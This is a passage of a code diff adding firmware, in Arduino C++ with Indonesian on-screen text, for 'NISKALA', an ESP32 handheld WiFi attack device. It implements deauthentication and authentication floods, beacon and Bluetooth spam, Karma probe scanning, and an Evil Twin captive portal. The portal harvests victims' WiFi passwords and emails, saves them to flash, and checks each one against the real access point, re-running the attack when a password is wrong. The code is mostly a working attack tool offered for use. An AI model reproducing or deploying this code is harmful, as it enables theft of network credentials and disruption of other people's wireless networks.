+  if (confirmDeleteAll) tft.print("> YAKIN? TEKAN LAGI!"); else tft.print("> HAPUS SEMUA DATA");
+  int yBack = 102;
+  if (viewSelection == total + 1) { tft.fillRect(0, yBack, 240, 15, TFT_GREEN); tft.setTextColor(TFT_BLACK, TFT_GREEN); }
+  else { tft.fillRect(0, yBack, 240, 15, TFT_BLACK); tft.setTextColor(TFT_WHITE, TFT_BLACK); }
+  tft.setCursor(10, yBack); tft.print("> KEMBALI");
+  drawFooter("ATAS: Scroll | BAWAH: OK");
+}
+
+// ═══════════════════════════════════════════════
+// Karma UI
+// ═══════════════════════════════════════════════
+void sortKarmaSSIDs() {
+  for (int i = 0; i < g_karmaSSIDCount - 1; i++) {
+    for (int j = i + 1; j < g_karmaSSIDCount; j++) {
+      if (g_karmaSSIDs[j].probeCount > g_karmaSSIDs[i].probeCount) {
+        KarmaSSIDEntry tmp = g_karmaSSIDs[i];
+        g_karmaSSIDs[i] = g_karmaSSIDs[j];
+        g_karmaSSIDs[j] = tmp;
+      }
+    }
+  }
+}
+
+void drawKarmaScan(int frame) {
+  tft.fillScreen(TFT_BLACK);
+  drawHeader("KARMA SCAN", TFT_MAGENTA);
+  tft.setTextFont(2); tft.setTextColor(TFT_WHITE, TFT_BLACK);
+
+  unsigned long elapsed = millis() - karmaScanStart;
+  int remain = (KARMA_SCAN_DURATION_MS > elapsed)
+               ? (KARMA_SCAN_DURATION_MS - elapsed) / 1000 : 0;
+
+  tft.setCursor(10, 28); tft.print("Waktu: ");
+  tft.setTextColor(TFT_YELLOW, TFT_BLACK); tft.print(remain); tft.println("s");
+
+  tft.setCursor(10, 44); tft.setTextColor(TFT_WHITE, TFT_BLACK); tft.print("Klien: ");
+  tft.setTextColor(TFT_CYAN, TFT_BLACK); tft.print(g_karmaClientCount);
+  tft.setTextColor(TFT_WHITE, TFT_BLACK); tft.print("  SSID: ");
+  tft.setTextColor(TFT_CYAN, TFT_BLACK); tft.println(g_karmaSSIDCount);
+
+  tft.setCursor(10, 60); tft.setTextColor(TFT_WHITE, TFT_BLACK); tft.print("Response: ");
+  tft.setTextColor(TFT_GREEN, TFT_BLACK); tft.println((uint32_t)g_karmaResponses);
+
+  // Radar animation
+  int cx = 200, cy = 55;
+  for (int i = 0; i < 3; i++) {
+    int r = (frame * 3 + i * 10) % 25;
+    if (r > 2) tft.drawCircle(cx, cy, r, r < 12 ? TFT_MAGENTA : TFT_PURPLE);
+  }
+  tft.fillCircle(cx, cy, 2, TFT_PINK);
+
+  // Live top 3 SSIDs
+  tft.drawFastHLine(0, 78, 240, TFT_DARKGREY);
+  tft.setTextFont(1); tft.setTextColor(TFT_CYAN, TFT_BLACK);
+  tft.setCursor(4, 80); tft.print("TOP SSID (live):");
+
+  // Sort for display
+  KarmaSSIDEntry temp[KARMA_MAX_SSIDS];
+  memcpy(temp, g_karmaSSIDs, sizeof(temp));
+  for (int i = 0; i < g_karmaSSIDCount - 1; i++) {
+    for (int j = i + 1; j < g_karmaSSIDCount; j++) {
+      if (temp[j].probeCount > temp[i].probeCount) {
+        KarmaSSIDEntry t = temp[i]; temp[i] = temp[j]; temp[j] = t;
+      }
+    }
+  }
+  for (int i = 0; i < 3 && i < g_karmaSSIDCount; i++) {
+    tft.setTextColor(TFT_WHITE, TFT_BLACK);
+    tft.setCursor(4, 90 + (i * 10));
+    char buf[40];
+    snprintf(buf, sizeof(buf), "%d. %-16s (%d)",
+             i + 1, temp[i].ssid, temp[i].probeCount);
+    tft.print(buf);
+  }
+  if (g_karmaSSIDCount == 0) {
+    tft.setTextColor(TFT_DARKGREY, TFT_BLACK);
+    tft.setCursor(4, 90);
+    tft.print("Menunggu probe");
+    for (int i = 0; i < (frame % 4); i++) tft.print(".");
+  }
+  drawFooter("TUNGGU / TOMBOL = BATAL");
+}
+
+void drawKarmaResults() {
+  tft.fillScreen(TFT_BLACK);
+  drawHeader("KARMA RESULTS", TFT_GREEN);
+  tft.setTextFont(2);
+
+  if (g_karmaSSIDCount == 0) {
+    tft.setTextColor(TFT_WHITE, TFT_BLACK);
+    tft.setCursor(10, 40); tft.println("Tidak ada probe.");
+    tft.setCursor(10, 60); tft.setTextColor(TFT_YELLOW, TFT_BLACK);
+    tft.println("Kembali tekan OK");
+  } else {
+    for (int i = 0; i < 4; i++) {
+      int idx = karmaScrollPos + i;
+      if (idx > g_karmaSSIDCount) break;
+      int y = 28 + (i * 22);
+
+      bool isSelected = (idx == karmaSelection);
+      bool isBack = (idx == g_karmaSSIDCount);
+
+      if (isSelected) {
+        tft.fillRect(0, y, 240, 20, TFT_DARKGREEN);
+        drawCornerBrackets(2, y+1, 236, 18, TFT_GREEN);
+        tft.setTextColor(TFT_GREEN, TFT_DARKGREEN);
+      } else {
+        tft.fillRect(0, y, 240, 20, TFT_BLACK);
+        tft.setTextColor(TFT_WHITE, TFT_BLACK);
+      }
+
+      tft.setCursor(10, y + 2);
+      if (idx < g_karmaSSIDCount) {
+        String s = String(g_karmaSSIDs[idx].ssid);
+        if (s.length() > 14) s = s.substring(0, 14);
+        char buf[40];
+        snprintf(buf, sizeof(buf), "%-14s %d",
+                 s.c_str(), g_karmaSSIDs[idx].probeCount);
+        tft.print(buf);
+      } else if (isBack) {
+        tft.print("<< KEMBALI");
+      }
+    }
+
+    if (karmaScrollPos > 0) tft.fillTriangle(228, 26, 236, 26, 232, 22, TFT_CYAN);
+    if (karmaScrollPos + 4 <= g_karmaSSIDCount) tft.fillTriangle(228, 112, 236, 112, 232, 116, TFT_CYAN);
+  }
+  drawFooter("ATAS: Pilih | BAWAH: OK");
+}
+
+// ═══════════════════════════════════════════════
+// NVS helpers
+// ═══════════════════════════════════════════════
+void savePasswordToNVS(String email, String pass) {
+  int count = prefs.getInt("pwd_count", 0);
+  if (count < MAX_SAVED_PWDS) {
+    prefs.putString(("pwd_" + String(count)).c_str(), email + "|" + pass);
+    prefs.putInt("pwd_count", count + 1);
+  }
+}
+void updatePasswordVerification(bool ok) {
+  int count = prefs.getInt("pwd_count", 0);
+  if (count <= 0) return;
+  String key = "pwd_" + String(count - 1);
+  String entry = prefs.getString(key.c_str(), "");
+  int p1 = entry.indexOf('|');
+  if (p1 < 0) return;
+  String email = entry.substring(0, p1);
+  String rest = entry.substring(p1 + 1);
+  int p2 = rest.indexOf('|');
+  String pass = (p2 > 0) ? rest.substring(0, p2) : rest;
+  prefs.putString(key.c_str(), email + "|" + pass + "|" + (ok ? "1" : "0"));
+}
+void deleteAllPasswordsFromNVS() {
+  prefs.clear();
+  viewSelection = 0; viewScrollPos = 0;
+}
+
+// ═══════════════════════════════════════════════
+// Web handlers
+// ═══════════════════════════════════════════════
+void handleRoot() {
+  if (verifyState == 2) {
+    server.send_P(200, "text/html", HTML_SUCCESS);
+    return;
+  }
+  if (verifyState == 3) {
+    verifyState = 0;
+    server.send_P(200, "text/html", HTML_ERROR);
+    return;
+  }
+  if (isReleasing || isVerifying || verifyState == 1) {
+    server.send_P(200, "text/html", HTML_VERIFYING);
+    return;
+  }
+  server.send_P(200, "text/html", getTemplate(selectedTemplateIdx));
+}
+
+void handleLogin() {
+  if (server.hasArg("password")) {
+    capturedPass = server.arg("password");
+    if (server.hasArg("email") && server.arg("email").length() > 0) {
+      capturedEmail = server.arg("email");
+    } else {
+      capturedEmail = "WiFi-Pass";
+    }
+    Serial.printf("[LOGIN] %s / %s\n", capturedEmail.c_str(), capturedPass.c_str());
+    savePasswordToNVS(capturedEmail, capturedPass);
+    isReleasing = true;
+    releaseTimer = millis();
+    verifyState = 1;
+    server.send_P(200, "text/html", HTML_VERIFYING);
+  } else {
+    server.send(400, "text/plain", "Bad Request");
+  }
+}
+
+void handleNotFound() {
+  server.sendHeader("Location", "http://192.168.4.1/", true);
+  server.send(302, "text/plain", "");
+}
+
+// ═══════════════════════════════════════════════
+// Engine control
+// ═══════════════════════════════════════════════
+void applyPromiscuousFilter(bool probeOnly) {
+  wifi_promiscuous_filter_t filter;
+  filter.filter_mask = probeOnly
+    ? WIFI_PROMIS_FILTER_MASK_MGMT
+    : (WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA);
+  esp_wifi_set_promiscuous_filter(&filter);
+}
+
+// ── Karma ──
+void startKarmaScan() {
+  // Reset data
+  memset(g_karmaSSIDs, 0, sizeof(g_karmaSSIDs));
+  memset(g_karmaClients, 0, sizeof(g_karmaClients));
+  g_karmaSSIDCount = 0;
+  g_karmaClientCount = 0;
+  g_karmaResponses = 0;
+  g_karmaActiveMode = true;
+
+  WiFi.mode(WIFI_AP_STA);
+  delay(200);
+  // AP tersembunyi untuk Karma Scan (hidden=1)
+  WiFi.softAP("Karma_Scan", NULL, 1, 1, 8);
+  delay(300);
+
+  applyPromiscuousFilter(false);
+  esp_wifi_set_promiscuous_rx_cb(packetSniffer_cb);
+  esp_wifi_set_promiscuous(true);
+
+  g_attackMode = ATK_KARMA;
+  isKarmaRunning = true;
+  karmaScanStart = millis();
+  Serial.println("[KARMA] Scan started (20s, active mode)");
+}
+
+void stopKarmaScan() {
+  isKarmaRunning = false;
+  g_attackMode = ATK_IDLE;
+  esp_wifi_set_promiscuous(false);
+  WiFi.mode(WIFI_STA);
+  Serial.println("[KARMA] Scan stopped");
+}
+
+// ── Deauth ──
+void startDeauthEngine() {
+  if (WiFi.getMode() != WIFI_AP_STA) WiFi.mode(WIFI_AP_STA);
+  uint8_t mac[6]; esp_wifi_get_mac(WIFI_IF_AP, mac);
+  if (memcmp(mac, g_targetBSSID, 6) != 0) { esp_wifi_set_mac(WIFI_IF_AP, g_targetBSSID); delay(50); }
+  // AP tersembunyi (hidden=1)
+  WiFi.softAP("Deauther_Fix", "12345678", 1, 1); delay(400);
+  applyPromiscuousFilter(false);
+  esp_wifi_set_promiscuous_rx_cb(packetSniffer_cb);
+  esp_wifi_set_promiscuous(true);
+  esp_wifi_set_channel(g_targetChannel, WIFI_SECOND_CHAN_NONE);
+  delay(100);
+  g_packetsSent = 0;
+  g_txErrors = 0;
+  g_victimFound = false;
+  isDeauthRunning = true;
+  g_attackMode = ATK_DEAUTH_TARGET;
+}
+
+void stopDeauthEngine() {
+  isDeauthRunning = false;
+  g_attackMode = ATK_IDLE;
+  esp_wifi_set_promiscuous(false);
+  WiFi.mode(WIFI_STA);
+}
+
+void startAuthFlood() {
+  if (WiFi.getMode() != WIFI_AP_STA) WiFi.mode(WIFI_AP_STA);
+  uint8_t mac[6]; esp_wifi_get_mac(WIFI_IF_AP, mac);
+  if (memcmp(mac, g_targetBSSID, 6) != 0) { esp_wifi_set_mac(WIFI_IF_AP, g_targetBSSID); delay(50); }
+  // AP tersembunyi (hidden=1)
+  WiFi.softAP("AuthFlood", "12345678", 1, 1); delay(300);
+  esp_wifi_set_promiscuous(false);
+  esp_wifi_set_channel(g_targetChannel, WIFI_SECOND_CHAN_NONE);
+  delay(100);
+  g_packetsSent = 0;
+  g_txErrors = 0;
+  isAuthFloodRunning = true;
+  g_attackMode = ATK_AUTH_FLOOD;
+}
+
+void stopAuthFlood() {
+  isAuthFloodRunning = false;
+  g_attackMode = ATK_IDLE;
+  WiFi.mode(WIFI_STA);
+}
+
+void startGlobalDeauth() {
+  if (WiFi.getMode() != WIFI_AP_STA) WiFi.mode(WIFI_AP_STA);
+  // AP tersembunyi (hidden=1)
+  WiFi.softAP("Global_Deauth", "12345678", 1, 1); delay(300);
+  esp_wifi_set_promiscuous(false);
+  g_packetsSent = 0;
+  g_txErrors = 0;
+  isGlobalDeauthRunning = true;
+  g_attackMode = ATK_DEAUTH_GLOBAL;
+}
+
+void stopGlobalDeauth() {
+  isGlobalDeauthRunning = false;
+  g_attackMode = ATK_IDLE;
+  WiFi.mode(WIFI_STA);
+}
+
+void startBeaconSpam() {
+  WiFi.mode(WIFI_AP);
+  // AP tersembunyi (hidden=1)
+  WiFi.softAP("Beacon_Init", "12345678", 1, 1); delay(300);
+  esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
+  esp_wifi_set_promiscuous(false);
+  g_packetsSent = 0;
+  g_txErrors = 0;
+  isBeaconRunning = true;
+  g_attackMode = ATK_BEACON;
+}
+
+void stopBeaconSpam() {
+  isBeaconRunning = false;
+  g_attackMode = ATK_IDLE;
+  WiFi.mode(WIFI_STA);
+}
+
+void startProbeSniffer() {
+  if (WiFi.getMode() != WIFI_AP_STA) WiFi.mode(WIFI_AP_STA);
+  // AP tersembunyi (hidden=1)
+  WiFi.softAP("Probe_Sniff", "12345678", 1, 1); delay(200);
+  g_probeLogHead = 0; g_probeLogCount = 0;
+  applyPromiscuousFilter(true);
+  esp_wifi_set_promiscuous_rx_cb(packetSniffer_cb);
+  esp_wifi_set_promiscuous(true);
+  isProbeRunning = true;
+  g_attackMode = ATK_PROBE;
+}
+
+void stopProbeSniffer() {
+  isProbeRunning = false;
+  g_attackMode = ATK_IDLE;
+  esp_wifi_set_promiscuous(false);
+  WiFi.mode(WIFI_STA);
+}
+
+void startBTSpam() {
+  WiFi.mode(WIFI_OFF);
+  if (btSpamInit()) {
+    isBTSpamRunning = true;
+    g_attackMode = ATK_IDLE;
+  }
+}
+
+void stopBTSpam() {
+  btSpamStop();
+  isBTSpamRunning = false;
+  WiFi.mode(WIFI_STA);
+}
+
+// ── Evil Twin ──
+void stopEvilTwin();
+
+void startEvilTwinWithDeauth() {
+  WiFi.mode(WIFI_AP_STA);
+  delay(200);
+
+  String safeSSID = targetSSID;
+  if (safeSSID.length() == 0) safeSSID = "Free_WiFi";
+
+  // JANGAN DI-HIDDEN, karena inti Evil Twin adalah SSID harus terlihat oleh korban.
+  bool apSuccess = WiFi.softAP(safeSSID.c_str(), NULL, g_targetChannel, 0, 4);
+  if (!apSuccess) {
+    Serial.println("[ERROR] Gagal membuat AP Palsu!");
+    stopEvilTwin();
+    currentState = MAIN_MENU;
+    drawMainMenu();
+    return;
+  }
+
+  esp_wifi_set_channel(g_targetChannel, WIFI_SECOND_CHAN_NONE);
+  delay(500);
+
+  IPAddress IP = WiFi.softAPIP();
+  dnsServer.start(DNS_PORT, "*", IP);
+  server.begin();
+
+  applyPromiscuousFilter(false);
+  esp_wifi_set_promiscuous_rx_cb(packetSniffer_cb);
+  esp_wifi_set_promiscuous(true);
+
+  g_packetsSent = 0;
+  g_txErrors = 0;
+  g_victimFound = false;
+  isReleasing = false;
+  isVerifying = false;
+  isEvilTwinRunning = true;
+  g_attackMode = ATK_EVIL_TWIN;
+  evilTwinStartTime = millis();
+
+  Serial.printf("Evil Twin Started. SSID: %s ch=%d (attempt %d/%d)\n",
+                safeSSID.c_str(), g_targetChannel,
+                verifyAttempts + 1, MAX_VERIFY_ATTEMPTS);
+}
+
+void stopEvilTwin() {
+  isEvilTwinRunning = false;
+  isReleasing = false;
+  isVerifying = false;
+  g_attackMode = ATK_IDLE;
+  server.stop();
+  dnsServer.stop();
+  esp_wifi_set_promiscuous(false);
+  WiFi.mode(WIFI_STA);
+}
+
+// ═══════════════════════════════════════════════
+// PMF detection
+// ═══════════════════════════════════════════════
+bool detectPMF(int idx) {
+  wifi_ap_record_t records[32];
+  uint16_t count = 32;
+  if (esp_wifi_scan_get_ap_records(&count, records) != ESP_OK) return false;
+  if (idx >= count) return false;
+  wifi_auth_mode_t m = records[idx].authmode;
+  return (m == WIFI_AUTH_WPA3_PSK || m == WIFI_AUTH_WPA2_WPA3_PSK);
+}
+
+// ═══════════════════════════════════════════════
+// Verification
+// ═══════════════════════════════════════════════
+void beginVerification() {
+  isReleasing = false;
+  isVerifying = true;
+  verifyStart = millis();
+  Serial.printf("[VERIFY] Attempt %d/%d starting\n",
+                verifyAttempts + 1, MAX_VERIFY_ATTEMPTS);
+  WiFi.begin(targetSSID.c_str(), capturedPass.c_str(), g_targetChannel, g_targetBSSID);
+}
+
+void updateVerification() {
+  if (!isVerifying) return;
+
+  if (WiFi.status() == WL_CONNECTED) {
+    verificationResult = true;
+    WiFi.disconnect();
+    updatePasswordVerification(true);
+    isVerifying = false;
+    verifyAttempts = 0;
+    verifyState = 2;
+    releaseAfterSuccess = millis() + SUCCESS_HOLD_MS;
+    Serial.println("[VERIFY] PASSWORD BENAR");
+    startEvilTwinWithDeauth();
+    return;
+  }
+
+  if (millis() - verifyStart > VERIFY_TIMEOUT_MS) {
+    WiFi.disconnect();
+    updatePasswordVerification(false);
+    isVerifying = false;
+    verifyAttempts++;
+
+    Serial.printf("[VERIFY] Attempt %d/%d FAILED\n",
+                  verifyAttempts, MAX_VERIFY_ATTEMPTS);
+
+    if (verifyAttempts >= MAX_VERIFY_ATTEMPTS) {
+      verifyState = 0;
+      verifyAttempts = 0;
+      tft.fillScreen(TFT_BLACK);
+      drawHeader("MAX PERCOBAAN", TFT_RED);
+      tft.setTextFont(2); tft.setTextColor(TFT_RED, TFT_BLACK);
+      tft.setCursor(10, 40); tft.println("5x password salah.");
+      tft.setCursor(10, 60); tft.println("Target dilepas.");
+      tft.setTextColor(TFT_CYAN, TFT_BLACK);
+      tft.setCursor(10, 85); tft.println("Kembali ke menu...");
+      delay(2500);
+      currentState = MAIN_MENU;
+      drawMainMenu();
+      return;
+    }
+
+    verifyState = 3;
+    startEvilTwinWithDeauth();
+
+    tft.fillScreen(TFT_BLACK);
+    drawHeader("PASSWORD SALAH", TFT_RED);
+    tft.setTextFont(2); tft.setTextColor(TFT_RED, TFT_BLACK);
+    tft.setCursor(10, 40); tft.println("Password salah.");
+    tft.setTextColor(TFT_YELLOW, TFT_BLACK);
+    tft.setCursor(10, 62);
+    tft.print("Percobaan: "); tft.print(verifyAttempts);
+    tft.print("/"); tft.println(MAX_VERIFY_ATTEMPTS);
+    tft.setTextColor(TFT_GREEN, TFT_BLACK);
+    tft.setCursor(10, 85); tft.println("Target input ulang...");
+    delay(1500);
+    drawEvilTwinRunning(0);
+  }
+}
+
+// ═══════════════════════════════════════════════
+// Navigation
+// ═══════════════════════════════════════════════
+void handleAPListNavigation() {
+  if (digitalRead(BTN_TOP) == LOW) {
+    delay(200);
+    selectedIdx++;
+    if (selectedIdx > apCount) selectedIdx = 0;
+    if (selectedIdx >= apScrollPos + 4) apScrollPos = selectedIdx - 3;
+    else if (selectedIdx < apScrollPos) apScrollPos = selectedIdx;
+    drawAPList();
+  }
+  if (digitalRead(BTN_BOTTOM) == LOW) {
+    delay(200);
+    if (selectedIdx == apCount) {
+      currentState = MAIN_MENU; drawMainMenu();
+    } else {
+      if (detectPMF(selectedIdx)) {
+        tft.fillScreen(TFT_BLACK);
+        drawHeader("TARGET DILINDUNGI PMF", TFT_RED);
+        tft.setTextFont(2); tft.setTextColor(TFT_YELLOW, TFT_BLACK);
+        tft.setCursor(10, 40); tft.println("Target pakai PMF/WPA3.");
+        tft.setCursor(10, 60); tft.println("Deauth TIDAK akan");
+        tft.setCursor(10, 80); tft.println("berhasil.");
+        tft.setTextColor(TFT_CYAN, TFT_BLACK);
+        tft.setCursor(10, 105); tft.println("Pilih AP lain.");
+        delay(2500); drawAPList();
+        return;
+      }
+      memcpy(g_targetBSSID, WiFi.BSSID(selectedIdx), 6);
+      g_targetChannel = WiFi.channel(selectedIdx);
+      targetSSID = WiFi.SSID(selectedIdx);
+
+      if (currentState == AP_LIST_DEAUTH) {
+        currentState = DEAUTH_MENU;
+        startDeauthEngine();
+        drawDeauthMenu();
+      } else if (currentState == AP_LIST_EVIL_TWIN) {
+        currentState = TEMPLATE_SELECT;
+        templateSelection = 0;
+        drawTemplateSelect();
+      } else if (currentState == AP_LIST_AUTH_FLOOD) {
+        currentState = AUTH_FLOOD_RUNNING;
+        startAuthFlood();
+        drawAuthFlood(0);
+      }
+    }
+  }
+}
+
+void handleTemplateSelect() {
+  if (digitalRead(BTN_TOP) == LOW) {
+    delay(200);
+    templateSelection = (templateSelection + 1) % TEMPLATE_COUNT;
+    drawTemplateSelect();
+  }
+  if (digitalRead(BTN_BOTTOM) == LOW) {
+    delay(200);
+    selectedTemplateIdx = templateSelection;
+    currentState = EVIL_TWIN_RUNNING;
+    verifyAttempts = 0;
+    verifyState = 0;
+    startEvilTwinWithDeauth();
+    drawEvilTwinRunning(0);
+  }
+}
+
+void handleKarmaResults() {
+  if (digitalRead(BTN_TOP) == LOW) {
+    delay(200);
+    karmaSelection++;
+    if (karmaSelection > g_karmaSSIDCount) karmaSelection = 0;
+    if (karmaSelection >= karmaScrollPos + 4) karmaScrollPos = karmaSelection - 3;
+    else if (karmaSelection < karmaScrollPos) karmaScrollPos = karmaSelection;
+    drawKarmaResults();
+  }
+  if (digitalRead(BTN_BOTTOM) == LOW) {
+    delay(200);
+
+    if (karmaSelection >= g_karmaSSIDCount) {
+      // BACK
+      karmaSelection = 0;
+      karmaScrollPos = 0;
+      currentState = MAIN_MENU;
+      drawMainMenu();
+      return;
+    }
+
+    // Select SSID
+    String selectedSSID = String(g_karmaSSIDs[karmaSelection].ssid);
+    int probes = g_karmaSSIDs[karmaSelection].probeCount;
+    Serial.printf("[KARMA] Selected: %s (%d probes)\n", selectedSSID.c_str(), probes);
+
+    // Tampil loading
+    tft.fillScreen(TFT_BLACK);
+    drawHeader("MENCARI AP ASLI...", TFT_ORANGE);
+    tft.setTextFont(2); tft.setTextColor(TFT_WHITE, TFT_BLACK);
+    tft.setCursor(10, 50);
+    tft.print("SSID: "); tft.setTextColor(TFT_CYAN, TFT_BLACK);
+    tft.println(selectedSSID.substring(0, 20));
+    tft.setTextColor(TFT_YELLOW, TFT_BLACK);
+    tft.setCursor(10, 80); tft.println("Scanning...");
+
+    // Cari BSSID + channel dari AP asli (jika ada)
+    uint8_t foundBSSID[6] = {0};
+    uint8_t foundChannel = 1;
+    bool found = false;
+
+    int n = WiFi.scanNetworks(false, true);
+    for (int i = 0; i < n; i++) {
+      if (WiFi.SSID(i) == selectedSSID) {
+        memcpy(foundBSSID, WiFi.BSSID(i), 6);
+        foundChannel = WiFi.channel(i);
+        found = true;
+        break;
+      }
+    }
+
+    memcpy(g_targetBSSID, foundBSSID, 6);
+    g_targetChannel = foundChannel;
+    targetSSID = selectedSSID;
+
+    if (found) {
+      Serial.printf("[KARMA] Found AP: BSSID=%02X:%02X:%02X:%02X:%02X:%02X ch=%d\n",
+                    g_targetBSSID[0], g_targetBSSID[1], g_targetBSSID[2],
+                    g_targetBSSID[3], g_targetBSSID[4], g_targetBSSID[5],
+                    g_targetChannel);
+    } else {
+      Serial.printf("[KARMA] AP not found — Evil Twin without deauth target\n");
+    }
+
+    // Reset verification state & transition
+    verifyAttempts = 0;
+    verifyState = 0;
+    currentState = EVIL_TWIN_RUNNING;
+    startEvilTwinWithDeauth();
+    drawEvilTwinRunning(0);
+  }
+}
+
+void doScanAnimation() {
+  tft.fillScreen(TFT_BLACK);
+  drawScanAnimation(0);
+  WiFi.scanNetworks(true, true);
+  int frame = 0;
+  while (true) {
+    int n = WiFi.scanComplete();
+    if (n >= 0) { apCount = n; break; }
+    if (n == -2) { apCount = 0; break; }
+    drawScanAnimation(frame++);
+    if (digitalRead(BTN_TOP) == LOW) {
+      WiFi.scanDelete(); apCount = -1; delay(200); break;
+    }
+    delay(60);
+  }
+}
+
+// ═══════════════════════════════════════════════
+// Disclaimer
+// ═══════════════════════════════════════════════
+void showDisclaimerFlow() {
+  while (true) {
+    drawDisclaimerScreen(tft, "NISKALA");
+    while (digitalRead(BTN_TOP) != LOW && digitalRead(BTN_BOTTOM) != LOW) delay(50);
+    delay(300);
+    drawConfirmationScreen(tft);
+    bool cancelled = false;
+    while (true) {
+      if (digitalRead(BTN_TOP) == LOW) { delay(300); cancelled = true; break; }
+      if (digitalRead(BTN_BOTTOM) == LOW) { delay(300); break; }
+      delay(50);
+    }
+    if (!cancelled) return;
+  }
+}
+
+// ═══════════════════════════════════════════════
+// Setup
+// ═══════════════════════════════════════════════
+void setup() {
+  Serial.begin(115200);
+  delay(300);
+  Serial.println();
+  Serial.println("==== NISKALA v1.0 ====");
+  Serial.printf("Chip : %s rev %d\n", ESP.getChipModel(), ESP.getChipRevision());
+  Serial.printf("Heap : %u bytes\n", ESP.getFreeHeap());
+
+  pinMode(BTN_TOP, INPUT_PULLUP);
+  pinMode(BTN_BOTTOM, INPUT_PULLUP);
+  prefs.begin("deauther", false);
+
+  server.on("/", handleRoot);
+  server.on("/login", HTTP_POST, handleLogin);
+  server.onNotFound(handleNotFound);
+
+  tft.init();
+  tft.setRotation(1);
+  tft.fillScreen(TFT_BLACK);
+
+  Serial.println("[1/4] Splash...");
+  drawElegantSplash();
+
+  Serial.println("[2/4] Disclaimer...");
+  showDisclaimerFlow();
+
+  WiFi.mode(WIFI_STA);
+  WiFi.disconnect();
+
+  Serial.println("[3/4] Start attack task...");
+  xTaskCreatePinnedToCore(
+    attackTask, "attack", 4096, NULL, 2, &attackTaskHandle, 0
+  );
+
+  Serial.println("[4/4] Draw main menu...");
+  drawMainMenu();
+
+  Serial.println("Setup selesai, heap tersisa: " + String(ESP.getFreeHeap()));
+}
+
+// ═══════════════════════════════════════════════
+// Loop
+// ═══════════════════════════════════════════════
+static unsigned long lastUI = 0;
+static int animFrame = 0;
+
+void loop() {
+  // ── KARMA_SCAN ──
+  if (currentState == KARMA_SCAN && isKarmaRunning) {
+    if (millis() - lastUI > 200) { drawKarmaScan(animFrame++); lastUI = millis(); }
+
+    // Auto-transition setelah 20s
+    if (millis() - karmaScanStart > KARMA_SCAN_DURATION_MS) {
+      stopKarmaScan();
+      sortKarmaSSIDs();
+      karmaSelection = 0;
+      karmaScrollPos = 0;
+      currentState = KARMA_RESULTS;
+      drawKarmaResults();
+      return;
+    }
+
+    // Cancel button
+    if (digitalRead(BTN_TOP) == LOW || digitalRead(BTN_BOTTOM) == LOW) {
+      delay(300);
+      stopKarmaScan();
+      currentState = MAIN_MENU;
+      drawMainMenu();
+    }
+    return;
+  }
+
+  // ── KARMA_RESULTS ──
+  if (currentState == KARMA_RESULTS) {
+    handleKarmaResults();
+    return;
+  }
+
+  // ── EVIL_TWIN: success state ──
+  if (verifyState == 2 && isEvilTwinRunning) {
+    dnsServer.processNextRequest();
+    server.handleClient();
+    if (millis() - lastUI > 400) {
+      tft.fillScreen(TFT_BLACK);
+      drawHeader("PASSWORD BENAR!", TFT_GREEN);
+      tft.setTextFont(2); tft.setTextColor(TFT_GREEN, TFT_BLACK);
+      tft.setCursor(10, 40); tft.println("Verifikasi sukses.");
+      tft.setTextColor(TFT_CYAN, TFT_BLACK);
+      tft.setCursor(10, 62); tft.println("Target akan dilepas");
+      int remain = (releaseAfterSuccess > millis()) ?
+                   ((releaseAfterSuccess - millis()) / 1000 + 1) : 0;
+      tft.setCursor(10, 82);
+      tft.print("dalam "); tft.print(remain); tft.println(" detik...");
+      tft.setTextColor(TFT_YELLOW, TFT_BLACK);
+      tft.setCursor(10, 102);
+      tft.print("Pass: "); tft.println(capturedPass.substring(0, 16));
+      lastUI = millis();
+    }
+    if (millis() > releaseAfterSuccess) {
+      stopEvilTwin();
+      verifyState = 0;
+      currentState = MAIN_MENU;
+      drawMainMenu();
+    }
+    return;
+  }
+
+  // ── EVIL_TWIN: verifying ──
+  if (isVerifying) {
+    updateVerification();
+    if (millis() - lastUI > 200) { drawEvilTwinRunning(animFrame++); lastUI = millis(); }
+    return;
+  }
+
+  // ── EVIL_TWIN: normal ──
+  if (isEvilTwinRunning) {
+    if (isReleasing) {
+      if (millis() - releaseTimer > RELEASE_DELAY_MS) {
+        stopEvilTwin();
+        beginVerification();
+        drawEvilTwinRunning(0);
+        return;
+      }
+    }
+    dnsServer.processNextRequest();
+    server.handleClient();
+    if (millis() - lastUI > 150) { drawEvilTwinRunning(animFrame++); lastUI = millis(); }
+    return;
+  }
+
+  // ── Fitur lain ──
+  if (currentState == DEAUTH_MENU && isDeauthRunning) {
+    if (millis() - lastUI > 200) { drawDeauthMenu(); lastUI = millis(); }
+  }
+  if (currentState == GLOBAL_DEAUTH && isGlobalDeauthRunning) {
+    if (millis() - lastUI > 150) { drawGlobalDeauth(animFrame++); lastUI = millis(); }
+  }
+  if (currentState == AUTH_FLOOD_RUNNING && isAuthFloodRunning) {
+    if (millis() - lastUI > 200) { drawAuthFlood(animFrame++); lastUI = millis(); }
+  }
+  if (currentState == BEACON_SPAM && isBeaconRunning) {
+    if (millis() - lastUI > 180) { drawBeaconSpam(animFrame++); lastUI = millis(); }
+  }
+  if (currentState == PROBE_SNIFF && isProbeRunning) {
+    if (millis() - lastUI > 250) { drawProbeSniff(animFrame++); lastUI = millis(); }
+  }
+  if (currentState == BT_SPAM && isBTSpamRunning) {
+    btSpamTick();
+    if (millis() - lastUI > 200) { drawBTSpam(animFrame++); lastUI = millis(); }
+  }
+
+  if (currentState == MAIN_MENU) {
+    if (digitalRead(BTN_TOP) == LOW) {
+      delay(200);
+      menuSelection = (menuSelection + 1) % MENU_COUNT;
+      if (menuSelection >= menuScrollPos + 4) menuScrollPos = menuSelection - 3;
+      else if (menuSelection < menuScrollPos) menuScrollPos = menuSelection;
+      drawMainMenu();
+    }
+    if (digitalRead(BTN_BOTTOM) == LOW) {
+      delay(200);
+      switch (menuSelection) {
+        case 0: case 1: case 5: {
+          doScanAnimation();
+          if (apCount == -1) { drawMainMenu(); }
+          else if (apCount == 0) {
+            tft.fillScreen(TFT_BLACK);
+            drawHeader("NO WIFI FOUND", TFT_RED);
+            delay(1500); drawMainMenu();
+          } else {
+            if (menuSelection == 0) currentState = AP_LIST_DEAUTH;
+            else if (menuSelection == 1) currentState = AP_LIST_EVIL_TWIN;
+            else currentState = AP_LIST_AUTH_FLOOD;
+            selectedIdx = 0; apScrollPos = 0;
+            drawAPList();
+          }
+          break;
+        }
+        case 2:
+          currentState = BEACON_SPAM;
+          startBeaconSpam();
+          drawBeaconSpam(0);
